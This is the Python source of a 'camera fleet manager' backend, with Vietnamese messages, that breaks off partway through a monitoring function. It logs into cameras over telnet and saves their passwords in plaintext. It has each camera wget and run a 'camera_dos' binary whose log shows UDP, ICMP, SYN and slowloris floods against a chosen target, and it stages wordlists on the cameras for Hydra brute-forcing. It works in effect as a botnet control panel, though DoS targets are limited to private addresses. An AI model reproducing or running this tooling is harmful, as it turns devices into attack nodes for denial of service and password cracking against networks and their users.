#!/usr/bin/env python3
"""Camera Fleet Manager — backend.

Zero-dependency core (+ pexpect for telnet). Controls VNPT camera fleet:
  - serves static frontend/ at /
  - REST API for scan, connect, deploy, exec, credentials
  - WebSocket /api/stream for real-time telemetry
  - Built-in HTTP file server for binary distribution to cameras (wget)
"""

import os
import re
import csv
import json
import time
import uuid
import shlex
import base64
import struct
import socket
import hashlib
import threading
import subprocess
import tempfile
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, parse_qs
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

try:
    import pexpect
except ImportError:
    pexpect = None

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
FRONTEND = os.path.join(ROOT, "frontend")
LOGDIR = os.path.join(ROOT, "logs")
LOGFILE = os.path.join(LOGDIR, "session.ndjson")
DATADIR = os.path.join(ROOT, "data")
BINDIR = os.path.join(ROOT, "binaries")
CRED_CSV = os.path.join(DATADIR, "credentials.csv")

PORT = int(os.environ.get("CAMFLEET_PORT", "8088"))
FILE_PORT = int(os.environ.get("CAMFLEET_FILE_PORT", "9999"))
HOST_IP = os.environ.get("CAMFLEET_HOST_IP", "")
NMAP = os.environ.get("CAMFLEET_NMAP", "nmap")
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
START_TS = time.time()

CRED_FIELDS = ["ip", "username", "password", "label", "group", "last_connected", "notes"]

os.makedirs(LOGDIR, exist_ok=True)
os.makedirs(DATADIR, exist_ok=True)
os.makedirs(BINDIR, exist_ok=True)

# ---------------------------------------------------------------- host IP
def detect_host_ip():
    """Auto-detect host IP on the camera subnet."""
    if HOST_IP:
        return HOST_IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("192.168.1.1", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# --------------------------------------------------------------- validation
_IPV4 = re.compile(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$")
_CIDR = re.compile(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/(\d{1,2})$")


def valid_ipv4(s):
    m = _IPV4.match((s or "").strip())
    return bool(m) and all(0 <= int(x) <= 255 for x in m.groups())


def valid_range(s):
    s = (s or "").strip()
    if valid_ipv4(s):
        return True
    m = _CIDR.match(s)
    if not m:
        return False
    return all(0 <= int(x) <= 255 for x in m.groups()[:4]) and 0 <= int(m.group(5)) <= 32


def is_private_ipv4(s):
    m = _IPV4.match((s or "").strip())
    if not m:
        return False
    o = [int(x) for x in m.groups()]
    if any(x > 255 for x in o):
        return False
    return o[0] == 10 or (o[0] == 172 and 16 <= o[1] <= 31) or (o[0] == 192 and o[1] == 168)


# ------------------------------------------------------------------- audit
_log_lock = threading.Lock()


def audit(entry):
    rec = dict(entry)
    rec.setdefault("ts", int(time.time()))
    try:
        line = json.dumps(rec, ensure_ascii=False)
        with _log_lock:
            with open(LOGFILE, "a", encoding="utf-8") as f:
                f.write(line + "\n")
    except Exception:
        pass


# ------------------------------------------------------------- telemetry hub
class WSClient:
    def __init__(self, conn):
        self.conn = conn
        self.lock = threading.Lock()
        self.open = True

    def _send(self, opcode, payload):
        n = len(payload)
        frame = bytearray([0x80 | opcode])
        if n < 126:
            frame.append(n)
        elif n < 65536:
            frame.append(126)
            frame += struct.pack(">H", n)
        else:
            frame.append(127)
            frame += struct.pack(">Q", n)
        frame += payload
        with self.lock:
            if not self.open:
                return
            try:
                self.conn.sendall(frame)
            except Exception:
                self.open = False

    def send_text(self, s):
        self._send(0x1, s.encode("utf-8"))

    def pong(self, payload):
        self._send(0xA, payload)

    def close(self):
        with self.lock:
            if self.open:
                try:
                    self.conn.sendall(bytes([0x88, 0x00]))
                except Exception:
                    pass
                self.open = False


class Hub:
    def __init__(self):
        self.clients = set()
        self.lock = threading.Lock()

    def add(self, c):
        with self.lock:
            self.clients.add(c)

    def remove(self, c):
        with self.lock:
            self.clients.discard(c)

    def broadcast(self, msg):
        data = json.dumps(msg, ensure_ascii=False)
        with self.lock:
            targets = list(self.clients)
        for c in targets:
            try:
                c.send_text(data)
            except Exception:
                self.remove(c)


# ------------------------------------------------------------- nmap parsing
def classify(line):
    l = line.strip()
    if not l:
        return None
    if "Discovered open port" in l:
        return ("ok", l.split("Discovered ", 1)[1])
    if l.startswith("Nmap scan report for"):
        if "[host down]" in l:
            return None
        return ("ok", "host sống: " + l.replace("Nmap scan report for ", ""))
    if "Host is up" in l:
        return ("info", l)
    if "% done" in l or "Timing:" in l:
        return ("info", l)
    if l.startswith("Starting Nmap") or l.startswith("Completed") or "Nmap done" in l:
        return ("info", l)
    return None


def parse_hosts(xml_path):
    hosts = []
    try:
        root = ET.parse(xml_path).getroot()
    except Exception:
        return {"hosts": []}, "0 host sống"
    for h in root.findall("host"):
        st = h.find("status")
        if st is None or st.get("state") != "up":
            continue
        ip = mac = vendor = hostname = ""
        rtt = ""
        for a in h.findall("address"):
            t = a.get("addrtype")
            if t == "ipv4":
                ip = a.get("addr", "")
            elif t == "mac":
                mac = a.get("addr", "")
                vendor = a.get("vendor", "") or ""
        hn = h.find("hostnames")
        if hn is not None:
            first = hn.find("hostname")
            if first is not None:
                hostname = first.get("name", "")
        times = h.find("times")
        if times is not None and times.get("srtt"):
            try:
                rtt = round(int(times.get("srtt")) / 1000)
            except Exception:
                rtt = ""
        hosts.append({"ip": ip, "hostname": hostname, "mac": mac, "vendor": vendor, "rtt_ms": rtt})
    return {"hosts": hosts}, f"{len(hosts)} host sống"


# --------------------------------------------------------- credential DB (CSV)
_cred_lock = threading.Lock()


def _read_creds():
    if not os.path.exists(CRED_CSV):
        return []
    with open(CRED_CSV, "r", newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        return [dict(row) for row in reader]


def _write_creds(rows):
    with open(CRED_CSV, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=CRED_FIELDS, extrasaction="ignore")
        writer.writeheader()
        for row in rows:
            writer.writerow(row)


def cred_list():
    with _cred_lock:
        return _read_creds()


def cred_save(entry):
    with _cred_lock:
        rows = _read_creds()
        ip = entry.get("ip", "").strip()
        found = False
        for i, r in enumerate(rows):
            if r.get("ip") == ip:
                rows[i] = {f: entry.get(f, r.get(f, "")) for f in CRED_FIELDS}
                found = True
                break
        if not found:
            rows.append({f: entry.get(f, "") for f in CRED_FIELDS})
        _write_creds(rows)
    return True


def cred_delete(ip):
    with _cred_lock:
        rows = _read_creds()
        rows = [r for r in rows if r.get("ip") != ip]
        _write_creds(rows)
    return True


def cred_save_batch(entries):
    with _cred_lock:
        rows = _read_creds()
        existing = {r["ip"]: i for i, r in enumerate(rows)}
        for entry in entries:
            ip = entry.get("ip", "").strip()
            if ip in existing:
                idx = existing[ip]
                rows[idx] = {f: entry.get(f, rows[idx].get(f, "")) for f in CRED_FIELDS}
            else:
                rows.append({f: entry.get(f, "") for f in CRED_FIELDS})
                existing[ip] = len(rows) - 1
        _write_creds(rows)
    return True


# ------------------------------------------------------------ telnet pool
class TelnetSession:
    def __init__(self, ip, username, password):
        self.ip = ip
        self.username = username
        self.password = password
        self.child = None
        self.connected = False
        self.lock = threading.Lock()

    def connect(self):
        if pexpect is None:
            raise RuntimeError("pexpect chưa cài — pip install pexpect")
        with self.lock:
            try:
                self.child = pexpect.spawn(
                    f"telnet {self.ip} 23", timeout=15, encoding="utf-8"
                )
                idx = self.child.expect(
                    ["login:", "Login:", "Username:", "Connection refused",
                     pexpect.TIMEOUT, pexpect.EOF],
                    timeout=10
                )
                if idx >= 3:
                    self.connected = False
                    return False, "Không thể kết nối telnet"

                self.child.sendline(self.username)
                idx = self.child.expect(
                    ["Password:", "password:", pexpect.TIMEOUT, pexpect.EOF],
                    timeout=10
                )
                if idx >= 2:
                    self.connected = False
                    return False, "Không nhận được prompt mật khẩu"

                self.child.sendline(self.password)
                idx = self.child.expect(
                    ["#", "\\$", "Login incorrect", "incorrect",
                     pexpect.TIMEOUT, pexpect.EOF],
                    timeout=10
                )
                if idx >= 2:
                    self.connected = False
                    return False, "Sai tài khoản/mật khẩu"

                self.connected = True
                return True, "OK"
            except Exception as e:
                self.connected = False
                return False, str(e)

    def run_cmd(self, cmd, timeout=15):
        with self.lock:
            if not self.connected or self.child is None:
                return False, "Chưa kết nối"
            try:
                self.child.sendline(cmd)
                self.child.expect(["#", "\\$"], timeout=timeout)
                output = self.child.before
                if isinstance(output, bytes):
                    output = output.decode("utf-8", errors="replace")
                lines = output.strip().split("\n")
                if lines and lines[0].strip() == cmd.strip():
                    lines = lines[1:]
                return True, "\n".join(lines).strip()
            except pexpect.TIMEOUT:
                return False, "Timeout chờ phản hồi"
            except (pexpect.EOF, OSError):
                self.connected = False
                return False, "Mất kết nối"

    def disconnect(self):
        with self.lock:
            self.connected = False
            if self.child:
                try:
                    self.child.sendline("exit")
                    self.child.close()
                except Exception:
                    pass
                self.child = None


class TelnetPool:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()

    def connect(self, ip, username, password):
        sess = TelnetSession(ip, username, password)
        ok, msg = sess.connect()
        if ok:
            with self.lock:
                old = self.sessions.get(ip)
                if old:
                    old.disconnect()
                self.sessions[ip] = sess
        return ok, msg

    def disconnect(self, ip):
        with self.lock:
            sess = self.sessions.pop(ip, None)
        if sess:
            sess.disconnect()
            return True
        return False

    def disconnect_all(self):
        with self.lock:
            sessions = list(self.sessions.values())
            self.sessions.clear()
        for sess in sessions:
            sess.disconnect()

    def get(self, ip):
        with self.lock:
            return self.sessions.get(ip)

    def connected_ips(self):
        with self.lock:
            return [ip for ip, s in self.sessions.items() if s.connected]

    def status(self):
        with self.lock:
            return {ip: {"connected": s.connected, "username": s.username}
                    for ip, s in self.sessions.items()}

    def run_cmd(self, ip, cmd, timeout=15):
        sess = self.get(ip)
        if not sess:
            return False, "Chưa kết nối"
        return sess.run_cmd(cmd, timeout)


# ------------------------------------------------------------ file server
def start_file_server():
    """Start HTTP server on FILE_PORT to serve binaries/ for camera wget."""

    class BinHandler(SimpleHTTPRequestHandler):
        def __init__(self, *a, **k):
            super().__init__(*a, directory=BINDIR, **k)

        def log_message(self, *a):
            pass

    try:
        httpd = ThreadingHTTPServer(("0.0.0.0", FILE_PORT), BinHandler)
        httpd.daemon_threads = True
        t = threading.Thread(target=httpd.serve_forever, daemon=True)
        t.start()
        print(f"[camfleet] file server on :{FILE_PORT}  dir={BINDIR}", flush=True)
    except Exception as e:
        print(f"[camfleet] file server failed: {e}", flush=True)


HYDRA_INPUT = os.path.join(DATADIR, "hydra-input")


def prepare_hydra_args(args_str):
    """Resolve approved server files; leave native Hydra processing to Hydra."""
    argv = shlex.split(args_str)
    i = 0
    while i < len(argv) and argv[i].startswith("--"):
        if argv[i] in ("--timeout", "--root"):
            i += 2
        elif argv[i] == "--dry-run":
            i += 1
        else:
            return args_str, []
    if i >= len(argv) or argv[i] != "hydra":
        return args_str, []
    files, seen = [], set()
    i += 1
    while i < len(argv):
        token = argv[i]
        flag = token[:2]
        if flag in ("-L", "-P", "-l", "-p", "-C"):
            if flag in seen:
                raise ValueError("Tùy chọn lặp: " + flag)
            seen.add(flag)
            attached = len(token) > 2
            if attached:
                value = token[2:]
            else:
                i += 1
                if i >= len(argv) or argv[i].startswith("-"):
                    raise ValueError("Thiếu giá trị cho " + flag)
                value = argv[i]
            if flag in ("-L", "-P"):
                name = "user.txt" if flag == "-L" else "password.txt"
                if value == "/tmp/hydra-input/" + name or value == name:
                    value = os.path.join(HYDRA_INPUT, name)
                source = os.path.realpath(value)
                allowed = os.path.realpath(HYDRA_INPUT)
                if os.path.commonpath([allowed, source]) != allowed:
                    raise ValueError("File phải nằm trong " + HYDRA_INPUT)
                try:
                    if not os.path.isfile(source):
                        raise OSError("không phải file thường")
                    with open(source, "rb") as stream:
                        data = stream.read()
                except OSError as exc:
                    raise ValueError("Không đọc được file " + value) from exc
                if not data:
                    raise ValueError("File rỗng: " + value)
                destination = "/tmp/hydra-input/" + name
                files.append((destination, data))
                argv[i] = flag + destination if attached else destination
        elif token in ("-t", "-T", "-w", "-W", "-c", "-s", "-m", "-o", "-b", "-e", "-M"):
            i += 1
        i += 1
    if ("-L" in seen and "-l" in seen) or ("-P" in seen and "-p" in seen) or (files and "-C" in seen):
        raise ValueError("Không trộn -L/-P với -l/-p tương ứng hoặc -C")
    return shlex.join(argv), files


def hydra_file_commands(files, marker):
    commands = ["test -x /tmp/camera-tools/bin/hydra",
                "umask 077 && mkdir -p /tmp/hydra-input && chmod 700 /tmp/hydra-input"]
    for destination, data in files:
        temp = destination + "." + uuid.uuid4().hex
        commands.append("umask 077 && printf '' > " + shlex.quote(temp))
        for offset in range(0, len(data), 128):
            encoded = "".join("\\%03o" % byte for byte in data[offset:offset + 128])
            commands.append("printf '%b' " + shlex.quote(encoded) + " >> " + shlex.quote(temp))
        commands.append("test -r " + shlex.quote(temp) + " && mv -f " + shlex.quote(temp) + " " + shlex.quote(destination))
    encoded_marker = "\\n" + "".join("\\%03o" % ord(char) for char in marker) + "\\n"
    return [cmd + " && printf " + shlex.quote(encoded_marker) for cmd in commands]


# ------------------------------------------------------------ engine
class Engine:
    def __init__(self, pool, hub):
        self.pool = pool
        self.hub = hub
        self.scan_state = "idle"
        self.scan_proc = None
        self.scan_stop = False
        self.scan_thread = None
        self.lock = threading.Lock()
        self.exec_procs = {}

    def _emit_log(self, module, level, text):
        self.hub.broadcast({"type": "log", "ts": int(time.time()), "module": module,
                       "level": level, "text": text})

    def _emit_result(self, module, data):
        self.hub.broadcast({"type": "result", "ts": int(time.time()), "module": module, "data": data})
        audit({"dir": "out", "type": "result", "module": module, "data": data})

    def _emit_status(self, module, state, summary=None):
        msg = {"type": "status", "ts": int(time.time()), "module": module, "state": state}
        if summary is not None:
            msg["summary"] = summary
        self.hub.broadcast(msg)

    # -- scan IP -------------------------------------------------------
    def scan_start(self, scan_range):
        with self.lock:
            if self.scan_state == "running":
                return 409, {"error": "Đang quét"}
            self.scan_state = "running"
            self.scan_stop = False

        self._emit_status("scan_ip", "running", f"Đang quét {scan_range}…")
        self._emit_log("scan_ip", "info", f"$ nmap -sn {scan_range}")

        def _run():
            xml_fd, xml_path = tempfile.mkstemp(suffix=".xml")
            os.close(xml_fd)
            cmd = [NMAP, "--privileged", "-sn", "-v", "--stats-every", "2s",
                   "-oX", xml_path, scan_range]
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, bufsize=1)
                self.scan_proc = proc
                for line in proc.stdout:
                    if self.scan_stop:
                        break
                    c = classify(line)
                    if c:
                        self._emit_log("scan_ip", c[0], c[1])
                proc.wait(timeout=5)
            except Exception as e:
                self._emit_log("scan_ip", "error", str(e))
            finally:
                if self.scan_proc:
                    try:
                        self.scan_proc.terminate()
                    except Exception:
                        pass

            data, summary = parse_hosts(xml_path)
            try:
                os.unlink(xml_path)
            except Exception:
                pass

            self._emit_result("scan_ip", data)
            self._emit_log("scan_ip", "ok", summary)
            with self.lock:
                self.scan_state = "idle"
                self.scan_proc = None
            self._emit_status("scan_ip", "idle", summary)

        self.scan_thread = threading.Thread(target=_run, daemon=True)
        self.scan_thread.start()
        return 200, {"accepted": True, "module": "scan_ip", "state": "running"}

    def scan_stop_cmd(self):
        self.scan_stop = True
        if self.scan_proc:
            try:
                self.scan_proc.terminate()
            except Exception:
                pass
        with self.lock:
            self.scan_state = "idle"
        self._emit_status("scan_ip", "idle", "Đã dừng")
        return 200, {"accepted": True}

    # -- connect cameras -----------------------------------------------
    def connect_cameras(self, cameras):
        results = []

        def _connect_one(cam):
            ip = cam["ip"]
            user = cam.get("username", "root")
            pw = cam.get("password", "")
            self._emit_log("connect", "info", f"Đang kết nối {ip}…")
            ok, msg = self.pool.connect(ip, user, pw)
            if ok:
                self._emit_log("connect", "ok", f"✓ {ip} — kết nối thành công")
                cred_save({"ip": ip, "username": user, "password": pw,
                           "last_connected": time.strftime("%Y-%m-%d %H:%M:%S")})
            else:
                self._emit_log("connect", "error", f"✗ {ip} — {msg}")
            results.append({"ip": ip, "ok": ok, "msg": msg})

        threads = []
        for cam in cameras:
            t = threading.Thread(target=_connect_one, args=(cam,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=20)

        ok_count = sum(1 for r in results if r["ok"])
        self._emit_result("connect", {"results": results})
        self._emit_log("connect", "ok", f"Kết nối xong: {ok_count}/{len(cameras)} thành công")
        return 200, {"accepted": True, "results": results}

    def disconnect_camera(self, ip):
        ok = self.pool.disconnect(ip)
        if ok:
            self._emit_log("connect", "info", f"Đã ngắt {ip}")
        return 200, {"accepted": True, "disconnected": ok}

    def disconnect_all(self):
        self.pool.disconnect_all()
        self._emit_log("connect", "info", "Đã ngắt tất cả")
        return 200, {"accepted": True}

    # -- check binary --------------------------------------------------
    def check_binary(self, ips=None):
        if ips is None:
            ips = self.pool.connected_ips()
        results = []

        def _check_one(ip):
            ok, output = self.pool.run_cmd(ip, "ls -la /tmp/camera_dos 2>/dev/null")
            exists = ok and "camera_dos" in output and "No such file" not in output
            size = ""
            if exists:
                parts = output.strip().split()
                for p in parts:
                    if p.isdigit() and int(p) > 100:
                        size = p
                        break
            ok2, out2 = self.pool.run_cmd(ip, "ls -la /tmp/camera-tools/cam-run 2>&1")
            tools_exists = ok2 and "cam-run" in out2 and "No such" not in (out2 or "")
            tools_size = ""
            if tools_exists:
                for p in (out2 or "").strip().split():
                    if p.isdigit() and int(p) > 100:
                        tools_size = p
                        break
            results.append({"ip": ip, "exists": exists, "size": size,
                            "tools_exists": tools_exists, "tools_size": tools_size,
                            "raw": output if ok else ""})

        threads = []
        for ip in ips:
            t = threading.Thread(target=_check_one, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=10)

        self._emit_result("binary", {"results": results})
        return 200, {"accepted": True, "results": results}

    # -- deploy binary -------------------------------------------------
    def deploy_binary(self, ips=None, filename="camera_dos"):
        if ips is None:
            ips = self.pool.connected_ips()

        filepath = os.path.join(BINDIR, filename)
        if not os.path.exists(filepath):
            return 400, {"error": f"File {filename} không tồn tại trong binaries/"}

        host_ip = detect_host_ip()
        url = f"http://{host_ip}:{FILE_PORT}/{filename}"
        results = []

        def _deploy_one(ip):
            self._emit_log("deploy", "info", f"[{ip}] wget {url} → /tmp/{filename}")
            ok, out = self.pool.run_cmd(ip, f"wget -q {url} -O /tmp/{filename}", timeout=30)
            if not ok:
                self._emit_log("deploy", "error", f"[{ip}] wget thất bại: {out}")
                results.append({"ip": ip, "ok": False, "msg": out})
                return
            ok2, out2 = self.pool.run_cmd(ip, f"chmod +x /tmp/{filename}")
            if ok2:
                self._emit_log("deploy", "ok", f"[{ip}] ✓ Deploy thành công")
                results.append({"ip": ip, "ok": True, "msg": "OK"})
            else:
                self._emit_log("deploy", "error", f"[{ip}] chmod thất bại: {out2}")
                results.append({"ip": ip, "ok": False, "msg": out2})

        threads = []
        for ip in ips:
            t = threading.Thread(target=_deploy_one, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=35)

        ok_count = sum(1 for r in results if r["ok"])
        self._emit_log("deploy", "ok", f"Deploy xong: {ok_count}/{len(ips)}")
        self._emit_result("deploy", {"results": results})
        return 200, {"accepted": True, "results": results}

    # -- delete binary -------------------------------------------------
    def delete_binary(self, ips=None, filename="camera_dos"):
        if ips is None:
            ips = self.pool.connected_ips()
        results = []

        def _delete_one(ip):
            ok, out = self.pool.run_cmd(ip, f"rm -f /tmp/{filename}")
            if ok:
                self._emit_log("deploy", "ok", f"[{ip}] ✓ Đã xóa /tmp/{filename}")
                results.append({"ip": ip, "ok": True, "msg": "OK"})
            else:
                self._emit_log("deploy", "error", f"[{ip}] Xóa thất bại: {out}")
                results.append({"ip": ip, "ok": False, "msg": out})

        threads = []
        for ip in ips:
            t = threading.Thread(target=_delete_one, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=10)

        self._emit_result("deploy", {"results": results})
        return 200, {"accepted": True, "results": results}

    # -- deploy camera-tools (tar.gz) ------------------------------------
    def deploy_tools(self, ips=None):
        if ips is None:
            ips = self.pool.connected_ips()

        filepath = os.path.join(BINDIR, "camera-tools.tar.gz")
        if not os.path.exists(filepath):
            return 400, {"error": "camera-tools.tar.gz không tồn tại trong binaries/"}

        host_ip = detect_host_ip()
        url = f"http://{host_ip}:{FILE_PORT}/camera-tools.tar.gz"
        results = []

        def _deploy_one(ip):
            tar_url = url.replace(".tar.gz", ".tar")
            self._emit_log("deploy", "info", f"[{ip}] Dọn dẹp /tmp…")
            self.pool.run_cmd(ip, "rm -rf /tmp/camera-tools /tmp/camera-tools.tar /tmp/camera-tools.tar.gz", timeout=10)
            # Stream extract: wget pipe to tar — never stores archive on disk
            self._emit_log("deploy", "info", f"[{ip}] Tải + giải nén camera-tools (stream)…")
            ok, out = self.pool.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O - | tar xf -", timeout=120)
            _, chk = self.pool.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
            extracted = "cam-run" in (chk or "") and "No such" not in (chk or "")
            if not extracted:
                # Fallback: download then extract
                self._emit_log("deploy", "info", f"[{ip}] Stream thất bại, thử tải file…")
                self.pool.run_cmd(ip, "rm -rf /tmp/camera-tools", timeout=5)
                self.pool.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O camera-tools.tar", timeout=120)
                self.pool.run_cmd(ip, "cd /tmp && tar xf camera-tools.tar 2>&1", timeout=60)
                self.pool.run_cmd(ip, "rm -f /tmp/camera-tools.tar", timeout=5)
                _, chk = self.pool.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
                extracted = "cam-run" in (chk or "") and "No such" not in (chk or "")
            if extracted:
                self.pool.run_cmd(ip, "chmod +x /tmp/camera-tools/cam-run /tmp/camera-tools/bin/* 2>/dev/null", timeout=10)
                self._emit_log("deploy", "ok", f"[{ip}] ✓ Deploy camera-tools thành công")
                results.append({"ip": ip, "ok": True, "msg": "OK"})
            else:
                self._emit_log("deploy", "error", f"[{ip}] Giải nén thất bại: {chk}")
                results.append({"ip": ip, "ok": False, "msg": chk or "extraction failed"})

        threads = []
        for ip in ips:
            t = threading.Thread(target=_deploy_one, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=180)

        ok_count = sum(1 for r in results if r["ok"])
        self._emit_log("deploy", "ok", f"Deploy camera-tools xong: {ok_count}/{len(ips)}")
        self._emit_result("deploy", {"results": results})
        return 200, {"accepted": True, "results": results}

    # -- delete camera-tools ---------------------------------------------
    def delete_tools(self, ips=None):
        if ips is None:
            ips = self.pool.connected_ips()
        results = []

        def _delete_one(ip):
            ok, out = self.pool.run_cmd(ip, "rm -rf /tmp/camera-tools /tmp/camera-tools.tar.gz")
            if ok:
                self._emit_log("deploy", "ok", f"[{ip}] ✓ Đã xóa camera-tools")
                results.append({"ip": ip, "ok": True, "msg": "OK"})
            else:
                self._emit_log("deploy", "error", f"[{ip}] Xóa thất bại: {out}")
                results.append({"ip": ip, "ok": False, "msg": out})

        threads = []
        for ip in ips:
            t = threading.Thread(target=_delete_one, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=10)

        self._emit_result("deploy", {"results": results})
        return 200, {"accepted": True, "results": results}

    # -- exec binary (phase 5) -----------------------------------------
    def exec_binary(self, ips, target_ip, args_str="", mode="dos"):
        files = []
        if mode != "dos":
            try:
                args_str, files = prepare_hydra_args(args_str)
            except ValueError as exc:
                return 400, {"error": str(exc)}
        if files:
            if not ips:
                return 400, {"error": "Chưa chọn hoặc kết nối Camera"}
            for ip in ips:
                marker = "HYDRA_READY_" + uuid.uuid4().hex
                for step, command in enumerate(hydra_file_commands(files, marker)):
                    ok, output = self.pool.run_cmd(ip, command, timeout=20)
                    if not ok or marker not in [line.strip() for line in output.splitlines()]:
                        if not ok:
                            message = f"[{ip}] Không gửi được lệnh chuẩn bị file: {output}"
                        elif step == 0:
                            message = f"[{ip}] Không tìm thấy Hydra có quyền thực thi tại /tmp/camera-tools/bin/hydra. Cần cài bản Hydra phù hợp với Camera; Hydra trên Pi không được dùng trong chế độ chạy Camera."
                        else:
                            message = f"[{ip}] Không ghi được file Hydra tại /tmp/hydra-input (bước {step}); kiểm tra quyền ghi và dung lượng /tmp."
                        self._emit_log("exec", "error", message)
                        return 400, {"error": message}
                self._emit_log("exec", "info", f"[{ip}] Đã chuẩn bị file Hydra")
        if mode == "dos":
            if not valid_ipv4(target_ip) or not is_private_ipv4(target_ip):
                return 403, {"error": f"Mục tiêu {target_ip} ngoài RFC1918"}
            cmd = f"/tmp/camera_dos {target_ip} {args_str}".strip()
            bg_cmd = f"killall camera_dos 2>/dev/null; rm -f /tmp/camdos.log; {cmd} > /tmp/camdos.log 2>&1 &"
            kill_name = "camera_dos"
        else:
            cmd = f"/tmp/camera-tools/cam-run --root /tmp/camera-tools {args_str}".strip()
            bg_cmd = f"rm -f /tmp/camtools.log; {cmd} > /tmp/camtools.log 2>&1 &"
            kill_name = None

        results = []

        def _exec_one(ip):
            self._emit_log("exec", "warn", f"[{ip}] $ {cmd}")
            ok, out = self.pool.run_cmd(ip, bg_cmd, timeout=10)
            logfile = "/tmp/camdos.log" if mode == "dos" else "/tmp/camtools.log"
            self.pool.run_cmd(ip, f"sleep 2 && head -10 {logfile}", timeout=8)
            results.append({"ip": ip, "ok": ok, "msg": out[:500]})

        threads = []
        for ip in ips:
            t = threading.Thread(target=_exec_one, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=15)

        self._emit_result("exec", {"results": results, "command": cmd})
        if mode == "dos":
            self._start_exec_monitor(ips)
        else:
            self._start_tools_monitor(ips)
        return 200, {"accepted": True, "results": results}

    def _start_exec_monitor(self, ips):
        self._exec_monitor_stop = False
        self._exec_monitor_ips = list(ips)
        self._exec_start_time = time.time()
        if getattr(self, '_exec_monitor_thread', None) and self._exec_monitor_thread.is_alive():
            return
        t = threading.Thread(target=self._exec_monitor_loop, daemon=True)
        self._exec_monitor_thread = t
        t.start()

    def _exec_monitor_loop(self):
        re_udp = re.compile(
            r'\[UDP\].*?(\d+)\s+goi.*?~(\d+(?:\.\d+)?)\s+goi/giay.*?hut.*?(\d+)\s+goi.*?\(([\d.]+)%\)')
        re_udp_simple = re.compile(
            r'\[UDP\].*?(\d+)\s+goi.*?~(\d+(?:\.\d+)?)\s+goi/giay')
        re_icmp = re.compile(
            r'\[ICMP\].*?(\d+)\s+goi.*?~(\d+(?:\.\d+)?)\s+goi/giay')
        re_slowloris = re.compile(
            r'(\d+(?:\.\d+)?)s\s*\|\s*(\d+)\s*\|\s*(\d+)/\s*(\d+)\s*\|\s*(\d+)\s*\|\s*(\d+)\s*\|\s*([\d.]+%|-)\s*\|\s*([\S]+)\s*\|\s*(\S+)')
        re_synflood = re.compile(r'SYN flood BAT.*?(\d+)\s+luong')
        re_mode = re.compile(r'che do VOLUMETRIC|ICMP flood BAT|UDP flood BAT|SYN flood BAT')

        while not self._exec_monitor_stop:
            time.sleep(4)
            if self._exec_monitor_stop:
                break
            cam_data = {}
            elapsed = int(time.time() - self._exec_start_time)
            for ip in list(self._exec_monitor_ips):
                try:
                    ok, out = self.pool.run_cmd(ip, "tail -20 /tmp/camdos.log 2>/dev/null", timeout=5)
                    if not ok or not out.strip():
                        cam_data[ip] = {"status": "waiting", "elapsed": elapsed}
                        continue
                    lines = out.strip().split("\n")
                    info = {"status": "running", "elapsed": elapsed, "modes": []}

                    for line in lines:
                        if 'ICMP flood BAT' in line:
                            if 'icmp' not in info['modes']:
                                info['modes'].append('icmp')
                        if 'UDP flood BAT' in line:
                            if 'udp' not in info['modes']:
                                info['modes'].append('udp')
                        if 'SYN flood BAT' in line:
                            if 'syn' not in info['modes']:
                                info['modes'].append('syn')
                        if 'giu' in line and 'ket noi/port' in line:
                            m = re.search(r'giu\s+(\d+)\s+ket noi', line)
                            if m:
                                info['slowloris_target'] = int(m.group(1))
                                if 'slowloris' not in info['modes']:
                                    info['modes'].append('slowloris')

                    for line in reversed(lines):
                        m = re_udp.search(line)
                        if m:
                            info['udp_total'] = int(m.group(1))
                            info['udp_pps'] = int(float(m.group(2)))
                            info['udp_drop'] = int(m.group(3))
                            info['udp_drop_pct'] = m.group(4)
                            break
                        m2 = re_udp_simple.search(line)
                        if m2:
                            info['udp_total'] = int(m2.group(1))
                            info['udp_pps'] = int(float(m2.group(2)))
                            break

                    for line in reversed(lines):
                        m = re_icmp.search(line)
                        if m:
                            info['icmp_total'] = int(m.group(1))
                            info['icmp_pps'] = int(float(m.group(2)))
                            break

                    for line in reversed(lines):
                        m = re_slowloris.search(line)
                        if m:
                            info['sl_time'] = m.group(1)
                            info['sl_port'] = int(m.group(2))
                            info['sl_held'] = int(m.group(3))
                            info['sl_target'] = int(m.group(4))
                            info['sl_samples'] = int(m.group(5))
                            info['sl_ok'] = int(m.group(6))
                            info['sl_rate'] = m.group(7)
                            info['sl_latency'] = m.group(8)
                            info['sl_health'] = m.group(9)
                            break

                    if 'g_stop' in out or 'TONG KET' in out:
                        info['status'] = 'stopped'

                    cam_data[ip] = info
                except Exception:
                    cam_data[ip] = {"status": "error", "elapsed": elapsed}

            self.hub.broadcast({"type": "exec_monitor", "data": cam_data})

    def _start_tools_monitor(self, ips):
        self._tools_monitor_stop = False
        self._tools_monitor_ips = list(ips)
        if getattr(self, '_tools_monitor_thread', None) and self._tools_monitor_thread.is_alive():
            return
